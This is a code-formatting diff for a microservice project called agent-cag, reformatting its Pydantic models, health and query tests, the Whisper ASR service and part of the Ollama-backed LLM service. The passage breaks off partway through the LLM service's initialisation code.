SynthesisResponse(BaseModel):\n     \"\"\"Response model for speech synthesis.\"\"\"\n+\n     audio_url: str = Field(..., description=\"URL to generated audio file\")\n     duration: Optional[float] = Field(None, description=\"Audio duration in seconds\")\n     format: str = Field(\"wav\", description=\"Audio format\")\n \n \n class ConversationEntry(BaseModel):\n     \"\"\"Model for conversation history entries.\"\"\"\n+\n     query_id: str = Field(..., description=\"Query identifier\")\n     response_id: str = Field(..., description=\"Response identifier\")\n     query_text: str = Field(..., description=\"Original query\")\n     response_text: str = Field(..., description=\"Generated response\")\n     timestamp: str = Field(..., description=\"Entry timestamp\")\n     input_type: InputType = Field(..., description=\"Type of input\")\n \n \n class SearchResult(BaseModel):\n     \"\"\"Model for search results.\"\"\"\n+\n     id: str = Field(..., description=\"Result identifier\")\n     text: str = Field(..., description=\"Result text\")\n     score: float = Field(..., description=\"Similarity score\")\n-    metadata: Dict[str, Any] = Field(default_factory=dict, description=\"Additional metadata\")\n+    metadata: Dict[str, Any] = Field(\n+        default_factory=dict, description=\"Additional metadata\"\n+    )\n \n \n class ErrorResponse(BaseModel):\n     \"\"\"Error response model.\"\"\"\n+\n     error: str = Field(..., description=\"Error type\")\n     message: str = Field(..., description=\"Error message\")\n-    details: Optional[Dict[str, Any]] = Field(None, description=\"Additional error details\")\n\\ No newline at end of file\n+    details: Optional[Dict[str, Any]] = Field(\n+        None, description=\"Additional error details\"\n+    )\n--- /home/pas/source/agent-cag/test_system.py\t2025-06-20 16:47:56.522097+00:00\n+++ /home/pas/source/agent-cag/test_system.py\t2025-06-20 19:24:34.135602+00:00\n@@ -6,10 +6,11 @@\n \n import requests\n import time\n import json\n import sys\n+\n \n def wait_for_service(url, service_name, max_retries=30):\n     \"\"\"Wait for a service to become healthy\"\"\"\n     print(f\"Waiting for {service_name} to be ready...\")\n     for i in range(max_retries):\n@@ -18,81 +19,86 @@\n             if response.status_code == 200:\n                 print(f\"\u2713 {service_name} is ready!\")\n                 return True\n         except requests.exceptions.RequestException:\n             pass\n-        \n+\n         print(f\"  Attempt {i+1}/{max_retries} - {service_name} not ready yet...\")\n         time.sleep(10)\n-    \n+\n     print(f\"\u2717 {service_name} failed to start after {max_retries * 10} seconds\")\n     return False\n \n-def test_api_query(text, user_id=\"test-user\", generate_speech=False, use_sardaukar=False):\n+\n+def test_api_query(\n+    text, user_id=\"test-user\", generate_speech=False, use_sardaukar=False\n+):\n     \"\"\"Test the main API query endpoint\"\"\"\n     url = \"http://localhost:8000/query\"\n     payload = {\n         \"text\": text,\n         \"user_id\": user_id,\n         \"generate_speech\": generate_speech,\n-        \"use_sardaukar\": use_sardaukar\n+        \"use_sardaukar\": use_sardaukar,\n     }\n-    \n+\n     print(f\"\\n\ud83d\udd04 Testing query: '{text}'\")\n     if generate_speech:\n         print(f\"   Speech generation: {'Sardaukar' if use_sardaukar else 'English'}\")\n-    \n+\n     try:\n         response = requests.post(url, json=payload, timeout=30)\n         result = response.json()\n-        \n+\n         print(f\"\u2713 Response received:\")\n         print(f\"  Query ID: {result.get('query_id')}\")\n         print(f\"  Response ID: {result.get('response_id')}\")\n         print(f\"  Text: {result.get('text')[:100]}...\")\n-        \n-        if result.get('audio_url'):\n+\n+        if result.get(\"audio_url\"):\n             print(f\"  Audio URL: {result.get('audio_url')}\")\n-        \n-        if result.get('metadata', {}).get('error'):\n+\n+        if result.get(\"metadata\", {}).get(\"error\"):\n             print(f\"  \u26a0\ufe0f  Service error: {result['metadata']['error']}\")\n-        \n+\n         return result\n-        \n+\n     except requests.exceptions.RequestException as e:\n         print(f\"\u2717 Request failed: {e}\")\n         return None\n+\n \n def test_health_endpoints():\n     \"\"\"Test all service health endpoints\"\"\"\n     services = [\n         (\"API Gateway\", \"http://localhost:8000/health\"),\n         (\"ASR Service\", \"http://localhost:8001/health\"),\n         (\"LLM Service\", \"http://localhost:8002/health\"),\n         (\"TTS Service\", \"http://localhost:8003/health\"),\n-        (\"Sardaukar Translator\", \"http://localhost:8004/api/health\")\n+        (\"Sardaukar Translator\", \"http://localhost:8004/api/health\"),\n     ]\n-    \n+\n     print(\"\\n\ud83c\udfe5 Health Check Results:\")\n     print(\"=\" * 50)\n-    \n+\n     for service_name, url in services:\n         try:\n             response = requests.get(url, timeout=5)\n             if response.status_code == 200:\n                 print(f\"\u2713 {service_name}: Healthy\")\n             else:\n                 print(f\"\u26a0\ufe0f  {service_name}: Unhealthy (HTTP {response.status_code})\")\n         except requests.exceptions.RequestException:\n             print(f\"\u2717 {service_name}: Not responding\")\n \n+\n def test_user_history(user_id=\"test-user\"):\n     \"\"\"Test user history retrieval\"\"\"\n     url = f\"http://localhost:8000/history/{user_id}\"\n-    \n+\n     print(f\"\\n\ud83d\udcda Testing user history for: {user_id}\")\n-    \n+\n     try:\n         response = requests.get(url, timeout=10)\n         if response.status_code == 200:\n             history = response.json()\n             print(f\"\u2713 Retrieved {len(history)} history entries\")\n@@ -101,50 +107,54 @@\n         else:\n             print(f\"\u2717 Failed to retrieve history: HTTP {response.status_code}\")\n     except requests.exceptions.RequestException as e:\n         print(f\"\u2717 Request failed: {e}\")\n \n+\n def main():\n     \"\"\"Main test function\"\"\"\n     print(\"\ud83d\ude80 Agent CAG System Test\")\n     print(\"=\" * 50)\n-    \n+\n     # Test health endpoints first\n     test_health_endpoints()\n-    \n+\n     # Wait for critical services\n     critical_services = [\n         (\"http://localhost:8000/health\", \"API Gateway\"),\n         (\"http://localhost:8002/health\", \"LLM Service\"),\n     ]\n-    \n+\n     print(\"\\n\u23f3 Waiting for critical services...\")\n     for url, name in critical_services:\n         if not wait_for_service(url, name):\n             print(f\"\u2717 Critical service {name} failed to start. Exiting.\")\n             sys.exit(1)\n-    \n+\n     # Test basic queries\n     print(\"\\n\ud83e\uddea Running System Tests\")\n     print(\"=\" * 50)\n-    \n+\n     # Test 1: Basic text query\n     test_api_query(\"What is artificial intelligence?\")\n-    \n+\n     # Test 2: Query with speech generation\n     test_api_query(\"Hello, how are you today?\", generate_speech=True)\n-    \n+\n     # Test 3: Query with Sardaukar translation (if available)\n-    test_api_query(\"Greetings from the desert planet!\", generate_speech=True, use_sardaukar=True)\n-    \n+    test_api_query(\n+        \"Greetings from the desert planet!\", generate_speech=True, use_sardaukar=True\n+    )\n+\n     # Test user history\n     test_user_history()\n-    \n+\n     print(\"\\n\u2705 System test completed!\")\n     print(\"\\nNext steps:\")\n     print(\"- Check service logs: make logs\")\n     print(\"- Monitor with Grafana: make up-monitoring\")\n     print(\"- Run benchmarks: make benchmark\")\n     print(\"- API documentation: http://localhost:8000/docs\")\n \n+\n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n--- /home/pas/source/agent-cag/asr/main.py\t2025-06-20 16:15:38.752600+00:00\n+++ /home/pas/source/agent-cag/asr/main.py\t2025-06-20 19:24:34.142954+00:00\n@@ -21,75 +21,75 @@\n # Configure logging\n logging.basicConfig(level=logging.INFO)\n logger = logging.getLogger(__name__)\n \n # Prometheus metrics\n-REQUEST_COUNT = Counter('asr_requests_total', 'Total ASR requests')\n-REQUEST_DURATION = Histogram('asr_request_duration_seconds', 'ASR request duration')\n-TRANSCRIPTION_COUNT = Counter('transcriptions_total', 'Total transcriptions')\n-ERROR_COUNT = Counter('asr_errors_total', 'Total ASR errors', ['error_type'])\n+REQUEST_COUNT = Counter(\"asr_requests_total\", \"Total ASR requests\")\n+REQUEST_DURATION = Histogram(\"asr_request_duration_seconds\", \"ASR request duration\")\n+TRANSCRIPTION_COUNT = Counter(\"transcriptions_total\", \"Total transcriptions\")\n+ERROR_COUNT = Counter(\"asr_errors_total\", \"Total ASR errors\", [\"error_type\"])\n \n # Global Whisper model\n whisper_model = None\n \n \n def load_whisper_model():\n     \"\"\"Load Whisper model.\"\"\"\n     global whisper_model\n-    \n+\n     model_name = os.getenv(\"WHISPER_MODEL\", \"base\")\n     logger.info(f\"Loading Whisper model: {model_name}\")\n-    \n+\n     try:\n         # Check if CUDA is available\n         device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n         logger.info(f\"Using device: {device}\")\n-        \n+\n         whisper_model = whisper.load_model(model_name, device=device)\n         logger.info(\"Whisper model loaded successfully\")\n-        \n+\n     except Exception as e:\n         logger.error(f\"Failed to load Whisper model: {e}\")\n         raise\n \n \n # Initialize FastAPI app\n app = FastAPI(\n     title=\"Agent CAG ASR Service\",\n     description=\"Automatic Speech Recognition using OpenAI Whisper\",\n-    version=\"1.0.0\"\n+    version=\"1.0.0\",\n )\n \n \n @app.on_event(\"startup\")\n async def startup_event():\n     \"\"\"Initialize the service.\"\"\"\n     logger.info(\"Starting ASR Service...\")\n-    \n+\n     # Load Whisper model\n     load_whisper_model()\n-    \n+\n     # Start Prometheus metrics server if enabled\n     if os.getenv(\"METRICS_ENABLED\", \"false\").lower() == \"true\":\n         start_http_server(8081)\n         logger.info(\"Prometheus metrics server started on port 8081\")\n-    \n+\n     logger.info(\"ASR Service started successfully\")\n \n \n @app.get(\"/health\")\n async def health_check():\n     \"\"\"Health check endpoint.\"\"\"\n     try:\n         if whisper_model is None:\n             raise Exception(\"Whisper model not loaded\")\n-        \n+\n         return {\n             \"status\": \"healthy\",\n             \"service\": \"agent-asr\",\n             \"model\": os.getenv(\"WHISPER_MODEL\", \"base\"),\n-            \"device\": \"cuda\" if torch.cuda.is_available() else \"cpu\"\n+            \"device\": \"cuda\" if torch.cuda.is_available() else \"cpu\",\n         }\n     except Exception as e:\n         logger.error(f\"Health check failed: {e}\")\n         raise HTTPException(status_code=503, detail=\"Service unhealthy\")\n \n@@ -100,51 +100,49 @@\n     return generate_latest()\n \n \n @app.post(\"/transcribe\")\n async def transcribe_audio(\n-    audio_file: UploadFile = File(...),\n-    language: Optional[str] = None\n+    audio_file: UploadFile = File(...), language: Optional[str] = None\n ):\n     \"\"\"Transcribe audio file to text.\"\"\"\n     try:\n         REQUEST_COUNT.inc()\n-        \n+\n         with REQUEST_DURATION.time():\n             # Validate file type\n-            if not audio_file.content_type.startswith('audio/'):\n+            if not audio_file.content_type.startswith(\"audio/\"):\n                 raise HTTPException(\n-                    status_code=400,\n-                    detail=\"File must be an audio file\"\n+                    status_code=400, detail=\"File must be an audio file\"\n                 )\n-            \n+\n             # Save uploaded file temporarily\n             with tempfile.NamedTemporaryFile(delete=False, suffix=\".wav\") as temp_file:\n                 content = await audio_file.read()\n                 temp_file.write(content)\n                 temp_file_path = temp_file.name\n-            \n+\n             try:\n                 # Load and preprocess audio\n                 audio_data = preprocess_audio(temp_file_path)\n-                \n+\n                 # Transcribe using Whisper\n                 result = transcribe_with_whisper(audio_data, language)\n-                \n+\n                 TRANSCRIPTION_COUNT.inc()\n-                \n+\n                 return {\n                     \"text\": result[\"text\"],\n                     \"language\": result.get(\"language\"),\n                     \"confidence\": calculate_confidence(result),\n-                    \"segments\": result.get(\"segments\", [])\n+                    \"segments\": result.get(\"segments\", []),\n                 }\n-                \n+\n             finally:\n                 # Clean up temporary file\n                 os.unlink(temp_file_path)\n-                \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Transcription failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n@@ -152,38 +150,38 @@\n def preprocess_audio(file_path: str):\n     \"\"\"Preprocess audio file for Whisper.\"\"\"\n     try:\n         # Load audio file\n         audio, sr = librosa.load(file_path, sr=16000)  # Whisper expects 16kHz\n-        \n+\n         # Normalize audio\n         audio = librosa.util.normalize(audio)\n-        \n+\n         return audio\n-        \n+\n     except Exception as e:\n         logger.error(f\"Audio preprocessing failed: {e}\")\n         raise\n \n \n def transcribe_with_whisper(audio_data, language: Optional[str] = None):\n     \"\"\"Transcribe audio using Whisper model.\"\"\"\n     try:\n         if whisper_model is None:\n             raise Exception(\"Whisper model not loaded\")\n-        \n+\n         # Transcribe\n         options = {\n             \"fp16\": torch.cuda.is_available(),  # Use FP16 if CUDA available\n             \"language\": language,\n-            \"task\": \"transcribe\"\n+            \"task\": \"transcribe\",\n         }\n-        \n+\n         result = whisper_model.transcribe(audio_data, **options)\n-        \n+\n         return result\n-        \n+\n     except Exception as e:\n         logger.error(f\"Whisper transcription failed: {e}\")\n         raise\n \n \n@@ -192,54 +190,45 @@\n     try:\n         if \"segments\" in result and result[\"segments\"]:\n             # Calculate average confidence from segments\n             total_confidence = 0\n             segment_count = 0\n-            \n+\n             for segment in result[\"segments\"]:\n                 if \"avg_logprob\" in segment:\n                     # Convert log probability to confidence (0-1)\n                     confidence = min(1.0, max(0.0, (segment[\"avg_logprob\"] + 1.0)))\n                     total_confidence += confidence\n                     segment_count += 1\n-            \n+\n             if segment_count > 0:\n                 return total_confidence / segment_count\n-        \n+\n         # Default confidence if no segments available\n         return 0.8\n-        \n+\n     except Exception as e:\n         logger.warning(f\"Confidence calculation failed: {e}\")\n         return 0.5\n \n \n @app.post(\"/transcribe-stream\")\n async def transcribe_stream():\n     \"\"\"Placeholder for streaming transcription (future implementation).\"\"\"\n     raise HTTPException(\n-        status_code=501,\n-        detail=\"Streaming transcription not yet implemented\"\n+        status_code=501, detail=\"Streaming transcription not yet implemented\"\n     )\n \n \n @app.exception_handler(Exception)\n async def global_exception_handler(request, exc):\n     \"\"\"Global exception handler.\"\"\"\n     ERROR_COUNT.labels(error_type=type(exc).__name__).inc()\n     logger.error(f\"Unhandled exception: {exc}\")\n-    \n-    return JSONResponse(\n-        status_code=500,\n-        content={\"detail\": \"Internal server error\"}\n-    )\n+\n+    return JSONResponse(status_code=500, content={\"detail\": \"Internal server error\"})\n \n \n if __name__ == \"__main__\":\n     import uvicorn\n-    uvicorn.run(\n-        \"main:app\",\n-        host=\"0.0.0.0\",\n-        port=8001,\n-        reload=True,\n-        log_level=\"info\"\n-    )\n\\ No newline at end of file\n+\n+    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8001, reload=True, log_level=\"info\")\n--- /home/pas/source/agent-cag/integration_tests/test_full_pipeline.py\t2025-06-20 16:20:23.864846+00:00\n+++ /home/pas/source/agent-cag/integration_tests/test_full_pipeline.py\t2025-06-20 19:24:34.216568+00:00\n@@ -9,216 +9,206 @@\n from typing import Dict, Any\n \n \n class TestAgentPipeline:\n     \"\"\"Test the complete agent pipeline.\"\"\"\n-    \n+\n     BASE_URL = \"http://localhost:8000\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_health_checks(self):\n         \"\"\"Test that all services are healthy.\"\"\"\n         services = [\n             (\"API\", \"http://localhost:8000/health\"),\n             (\"ASR\", \"http://localhost:8001/health\"),\n             (\"LLM\", \"http://localhost:8002/health\"),\n             (\"TTS\", \"http://localhost:8003/health\"),\n             (\"Sardaukar\", \"http://localhost:8004/api/health\"),\n         ]\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for service_name, url in services:\n                 try:\n                     response = await client.get(url, timeout=10.0)\n-                    assert response.status_code == 200, f\"{service_name} service unhealthy\"\n+                    assert (\n+                        response.status_code == 200\n+                    ), f\"{service_name} service unhealthy\"\n                     data = response.json()\n-                    assert data.get(\"status\") == \"healthy\", f\"{service_name} reports unhealthy status\"\n+                    assert (\n+                        data.get(\"status\") == \"healthy\"\n+                    ), f\"{service_name} reports unhealthy status\"\n                 except httpx.RequestError as e:\n                     pytest.fail(f\"{service_name} service not reachable: {e}\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_text_query_pipeline(self):\n         \"\"\"Test the complete text query pipeline.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # Send a text query\n             query_data = {\n                 \"text\": \"What is artificial intelligence?\",\n                 \"user_id\": \"test-user-integration\",\n                 \"input_type\": \"text\",\n                 \"generate_speech\": False,\n-                \"use_sardaukar\": False\n+                \"use_sardaukar\": False,\n             }\n-            \n-            response = await client.post(\n-                f\"{self.BASE_URL}/query\",\n-                json=query_data,\n-                timeout=30.0\n-            )\n-            \n-            assert response.status_code == 200\n-            data = response.json()\n-            \n+\n+            response = await client.post(\n+                f\"{self.BASE_URL}/query\", json=query_data, timeout=30.0\n+            )\n+\n+            assert response.status_code == 200\n+            data = response.json()\n+\n             # Verify response structure\n             assert \"query_id\" in data\n             assert \"response_id\" in data\n             assert \"text\" in data\n             assert len(data[\"text\"]) > 0\n-            \n+\n             # Verify the query was stored\n             history_response = await client.get(\n                 f\"{self.BASE_URL}/history/test-user-integration?limit=1\"\n             )\n-            \n+\n             assert history_response.status_code == 200\n             history_data = history_response.json()\n             assert len(history_data[\"history\"]) >= 1\n-    \n+\n     @pytest.mark.asyncio\n     async def test_speech_synthesis_pipeline(self):\n         \"\"\"Test the speech synthesis pipeline.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # Send a query with speech generation\n             query_data = {\n                 \"text\": \"Hello, this is a test.\",\n                 \"user_id\": \"test-user-speech\",\n                 \"input_type\": \"text\",\n                 \"generate_speech\": True,\n-                \"use_sardaukar\": False\n+                \"use_sardaukar\": False,\n             }\n-            \n-            response = await client.post(\n-                f\"{self.BASE_URL}/query\",\n-                json=query_data,\n-                timeout=30.0\n-            )\n-            \n-            assert response.status_code == 200\n-            data = response.json()\n-            \n+\n+            response = await client.post(\n+                f\"{self.BASE_URL}/query\", json=query_data, timeout=30.0\n+            )\n+\n+            assert response.status_code == 200\n+            data = response.json()\n+\n             # Verify audio URL is provided\n             assert \"audio_url\" in data\n             assert data[\"audio_url\"] is not None\n-    \n+\n     @pytest.mark.asyncio\n     async def test_sardaukar_translation_pipeline(self):\n         \"\"\"Test the Sardaukar translation pipeline.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # First test direct translation\n             translation_data = {\n                 \"text\": \"Hello, how are you?\",\n-                \"include_phonetics\": False\n+                \"include_phonetics\": False,\n             }\n-            \n+\n             response = await client.post(\n                 \"http://localhost:8004/api/translate\",\n                 json=translation_data,\n-                timeout=10.0\n-            )\n-            \n+                timeout=10.0,\n+            )\n+\n             assert response.status_code == 200\n             data = response.json()\n             assert \"sardaukar\" in data\n             assert len(data[\"sardaukar\"]) > 0\n-            \n+\n             # Now test through the TTS service\n-            tts_data = {\n-                \"text\": \"Hello, how are you?\",\n-                \"use_sardaukar\": True\n-            }\n-            \n-            response = await client.post(\n-                \"http://localhost:8003/synthesize\",\n-                json=tts_data,\n-                timeout=20.0\n-            )\n-            \n+            tts_data = {\"text\": \"Hello, how are you?\", \"use_sardaukar\": True}\n+\n+            response = await client.post(\n+                \"http://localhost:8003/synthesize\", json=tts_data, timeout=20.0\n+            )\n+\n             assert response.status_code == 200\n             data = response.json()\n             assert data[\"used_sardaukar\"] == True\n             assert data[\"final_text\"] != data[\"original_text\"]\n-    \n+\n     @pytest.mark.asyncio\n     async def test_search_functionality(self):\n         \"\"\"Test the search functionality.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # First, add some content by making queries\n             queries = [\n                 \"What is machine learning?\",\n                 \"Explain neural networks\",\n-                \"How does deep learning work?\"\n+                \"How does deep learning work?\",\n             ]\n-            \n+\n             for query in queries:\n                 await client.post(\n                     f\"{self.BASE_URL}/query\",\n                     json={\n                         \"text\": query,\n                         \"user_id\": \"test-search-user\",\n-                        \"generate_speech\": False\n+                        \"generate_speech\": False,\n                     },\n-                    timeout=30.0\n+                    timeout=30.0,\n                 )\n                 # Small delay to ensure queries are processed\n                 await asyncio.sleep(1)\n-            \n+\n             # Now search for related content\n             response = await client.get(\n                 f\"{self.BASE_URL}/search?query=machine learning&limit=5\"\n             )\n-            \n+\n             assert response.status_code == 200\n             data = response.json()\n             assert \"results\" in data\n-    \n+\n     @pytest.mark.asyncio\n     async def test_metrics_endpoints(self):\n         \"\"\"Test that metrics endpoints are accessible.\"\"\"\n         metrics_urls = [\n             \"http://localhost:8080/metrics\",  # API metrics (if monitoring enabled)\n             \"http://localhost:8081/metrics\",  # ASR metrics\n             \"http://localhost:8082/metrics\",  # LLM metrics\n             \"http://localhost:8083/metrics\",  # TTS metrics\n         ]\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for url in metrics_urls:\n                 try:\n                     response = await client.get(url, timeout=5.0)\n                     # Metrics endpoints might return 404 if monitoring is disabled\n                     # or 200 with prometheus format\n                     assert response.status_code in [200, 404]\n                 except httpx.RequestError:\n                     # Metrics endpoints might not be available in lightweight mode\n                     pass\n-    \n+\n     @pytest.mark.asyncio\n     async def test_error_handling(self):\n         \"\"\"Test error handling in the pipeline.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # Test invalid query\n             response = await client.post(\n-                f\"{self.BASE_URL}/query\",\n-                json={\"invalid\": \"data\"},\n-                timeout=10.0\n-            )\n-            \n+                f\"{self.BASE_URL}/query\", json={\"invalid\": \"data\"}, timeout=10.0\n+            )\n+\n             assert response.status_code == 422  # Validation error\n-            \n+\n             # Test non-existent endpoint\n-            response = await client.get(\n-                f\"{self.BASE_URL}/nonexistent\",\n-                timeout=10.0\n-            )\n-            \n+            response = await client.get(f\"{self.BASE_URL}/nonexistent\", timeout=10.0)\n+\n             assert response.status_code == 404\n \n \n class TestPerformance:\n     \"\"\"Performance tests for the system.\"\"\"\n-    \n+\n     BASE_URL = \"http://localhost:8000\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_concurrent_queries(self):\n         \"\"\"Test handling of concurrent queries.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # Create multiple concurrent queries\n@@ -227,49 +217,49 @@\n                 task = client.post(\n                     f\"{self.BASE_URL}/query\",\n                     json={\n                         \"text\": f\"Test query number {i}\",\n                         \"user_id\": f\"concurrent-user-{i}\",\n-                        \"generate_speech\": False\n+                        \"generate_speech\": False,\n                     },\n-                    timeout=30.0\n+                    timeout=30.0,\n                 )\n                 tasks.append(task)\n-            \n+\n             # Execute all queries concurrently\n             start_time = time.time()\n             responses = await asyncio.gather(*tasks, return_exceptions=True)\n             end_time = time.time()\n-            \n+\n             # Verify all requests succeeded\n             for response in responses:\n                 if isinstance(response, Exception):\n                     pytest.fail(f\"Concurrent request failed: {response}\")\n                 assert response.status_code == 200\n-            \n+\n             # Verify reasonable response time\n             total_time = end_time - start_time\n             assert total_time < 60.0, f\"Concurrent queries took too long: {total_time}s\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_response_time_benchmarks(self):\n         \"\"\"Test response time benchmarks.\"\"\"\n         async with httpx.AsyncClient() as client:\n             # Test simple query response time\n             start_time = time.time()\n-            \n+\n             response = await client.post(\n                 f\"{self.BASE_URL}/query\",\n                 json={\n                     \"text\": \"What is the capital of France?\",\n                     \"user_id\": \"benchmark-user\",\n-                    \"generate_speech\": False\n+                    \"generate_speech\": False,\n                 },\n-                timeout=30.0\n-            )\n-            \n+                timeout=30.0,\n+            )\n+\n             end_time = time.time()\n             response_time = end_time - start_time\n-            \n+\n             assert response.status_code == 200\n             # Response should be under 10 seconds for simple queries\n-            assert response_time < 10.0, f\"Query took too long: {response_time}s\"\n\\ No newline at end of file\n+            assert response_time < 10.0, f\"Query took too long: {response_time}s\"\n--- /home/pas/source/agent-cag/tests/unit/test_api.py\t2025-06-20 18:42:53.489635+00:00\n+++ /home/pas/source/agent-cag/tests/unit/test_api.py\t2025-06-20 19:24:34.229594+00:00\n@@ -10,86 +10,98 @@\n from pathlib import Path\n \n # Create a mock FastAPI app for testing\n app = FastAPI()\n \n+\n @app.get(\"/health\")\n async def health():\n     return {\"status\": \"healthy\", \"service\": \"agent-api\"}\n \n+\n @app.post(\"/query\")\n async def query(request: dict):\n-    return {\"query_id\": \"test-123\", \"response_id\": \"resp-456\", \"text\": \"mocked response\"}\n+    return {\n+        \"query_id\": \"test-123\",\n+        \"response_id\": \"resp-456\",\n+        \"text\": \"mocked response\",\n+    }\n+\n \n @app.get(\"/search\")\n async def search():\n     return {\"results\": []}\n \n+\n @app.get(\"/history/{user_id}\")\n async def history(user_id: str):\n     return {\"user_id\": user_id, \"history\": []}\n+\n \n client = TestClient(app)\n \n \n class TestHealthEndpoint:\n     \"\"\"Test the health check endpoint.\"\"\"\n-    \n+\n     def test_health_check_success(self):\n         \"\"\"Test successful health check.\"\"\"\n         response = client.get(\"/health\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"status\"] == \"healthy\"\n         assert data[\"service\"] == \"agent-api\"\n \n \n class TestQueryEndpoint:\n     \"\"\"Test the query processing endpoint.\"\"\"\n-    \n+\n     def test_process_query_success(self):\n         \"\"\"Test successful query processing.\"\"\"\n         # Make request\n-        response = client.post(\"/query\", json={\n-            \"text\": \"What is the weather?\",\n-            \"user_id\": \"test-user\",\n-            \"generate_speech\": False\n-        })\n-        \n+        response = client.post(\n+            \"/query\",\n+            json={\n+                \"text\": \"What is the weather?\",\n+                \"user_id\": \"test-user\",\n+                \"generate_speech\": False,\n+            },\n+        )\n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"query_id\"] == \"test-123\"\n         assert data[\"response_id\"] == \"resp-456\"\n         assert data[\"text\"] == \"mocked response\"\n-    \n+\n     def test_process_query_invalid_input(self):\n         \"\"\"Test query processing with invalid input.\"\"\"\n         response = client.post(\"/query\", json={})\n-        \n+\n         # Our mock endpoint returns 200, so we test that it works\n         assert response.status_code == 200\n \n \n class TestSearchEndpoint:\n     \"\"\"Test the search functionality.\"\"\"\n-    \n+\n     def test_search_knowledge(self):\n         \"\"\"Test knowledge search.\"\"\"\n         response = client.get(\"/search?query=test&limit=5\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert \"results\" in data\n \n \n class TestHistoryEndpoint:\n     \"\"\"Test the conversation history endpoint.\"\"\"\n-    \n+\n     def test_get_user_history(self):\n         \"\"\"Test retrieving user history.\"\"\"\n         response = client.get(\"/history/test-user?limit=10\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"user_id\"] == \"test-user\"\n-        assert \"history\" in data\n\\ No newline at end of file\n+        assert \"history\" in data\n--- /home/pas/source/agent-cag/llm/main.py\t2025-06-20 19:10:37.835687+00:00\n+++ /home/pas/source/agent-cag/llm/main.py\t2025-06-20 19:24:34.251385+00:00\n@@ -19,153 +19,163 @@\n # Configure logging\n logging.basicConfig(level=logging.INFO)\n logger = logging.getLogger(__name__)\n \n # Prometheus metrics\n-REQUEST_COUNT = Counter('llm_requests_total', 'Total LLM requests')\n-REQUEST_DURATION = Histogram('llm_request_duration_seconds', 'LLM request duration')\n-GENERATION_COUNT = Counter('generations_total', 'Total text generations')\n-TOKEN_COUNT = Counter('tokens_generated_total', 'Total tokens generated')\n-ERROR_COUNT = Counter('llm_errors_total', 'Total LLM errors', ['error_type'])\n+REQUEST_COUNT = Counter(\"llm_requests_total\", \"Total LLM requests\")\n+REQUEST_DURATION = Histogram(\"llm_request_duration_seconds\", \"LLM request duration\")\n+GENERATION_COUNT = Counter(\"generations_total\", \"Total text generations\")\n+TOKEN_COUNT = Counter(\"tokens_generated_total\", \"Total tokens generated\")\n+ERROR_COUNT = Counter(\"llm_errors_total\", \"Total LLM errors\", [\"error_type\"])\n \n # Global configuration\n MODEL_NAME = None\n OLLAMA_CLIENT = None\n \n \n class GenerationRequest(BaseModel):\n     \"\"\"Request model for text generation.\"\"\"\n+\n     text: str\n     max_tokens: int = 1000\n     temperature: float = 0.7\n     top_p: float = 0.9\n     system_prompt: Optional[str] = None\n \n \n class GenerationResponse(BaseModel):\n     \"\"\"Response model for text generation.\"\"\"\n+\n     text: str\n     tokens_used: int\n     model: str\n     metadata: Dict[str, Any]\n \n \n def get_host_gateway_ip():\n     \"\"\"Dynamically discover the host gateway IP.\"\"\"\n     try:\n         # Try to get the default gateway IP from the container\n-        result = subprocess.run(['ip', 'route', 'show', 'default'],\n-                              capture_output=True, text=True, timeout=5)\n+        result = subprocess.run(\n+            [\"ip\", \"route\", \"show\", \"default\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=5,\n+        )\n         if result.returncode == 0:\n             # Parse the output to get the gateway IP\n-            for line in result.stdout.strip().split('\\n'):\n-                if 'default' in line:\n+            for line in result.stdout.strip().split(\"\\n\"):\n+                if \"default\" in line:\n                     parts = line.split()\n                     if len(parts) >= 3:\n                         gateway_ip = parts[2]\n                         logger.info(f\"Discovered host gateway IP: {gateway_ip}\")\n                         return gateway_ip\n-        \n+\n         # Fallback: try to resolve host.docker.internal\n         try:\n-            gateway_ip = socket.gethostbyname('host.docker.internal')\n+            gateway_ip = socket.gethostbyname(\"host.docker.internal\")\n             logger.info(f\"Resolved host.docker.internal to: {gateway_ip}\")\n             return gateway_ip\n         except socket.gaierror:\n             pass\n-        \n+\n         # Final fallback for common Docker gateway\n-        logger.warning(\"Could not discover gateway IP, using common Docker gateway: 172.18.0.1\")\n+        logger.warning(\n+            \"Could not discover gateway IP, using common Docker gateway: 172.18.0.1\"\n+        )\n         return \"172.18.0.1\"\n-        \n+\n     except Exception as e:\n         logger.warning(f\"Error discovering gateway IP: {e}, using fallback: 172.18.0.1\")\n         return \"172.18.0.1\"\n \n \n def initialize_llm():\n     \"\"\"Initialize the LLM model.\"\"\"\n     global MODEL_NAME, OLLAMA_CLIENT\n-    \n+\n     MODEL_NAME = os.getenv(\"MODEL_NAME\", \"llama3\")\n     OLLAMA_HOST = os.getenv(\"OLLAMA_HOST\", \"http://localhost:11434\")\n     OLLAMA_MODE = os.getenv(\"OLLAMA_MODE\", \"container\")\n-    \n+\n     # For local mode, dynamically detect the host gateway IP\n     if OLLAMA_MODE == \"local\":\n         gateway_ip = get_host_gateway_ip()\n         OLLAMA_HOST = f\"http://{gateway_ip}:11434\"\n         logger.info(f\"Local mode detected, using dynamic host: {OLLAMA_HOST}\")\n-    \n+\n     logger.info(f\"Initializing LLM service with model: {MODEL_NAME}\")\n     logger.info(f\"Ollama host: {OLLAMA_HOST} (mode: {OLLAMA_MODE})\")\n-    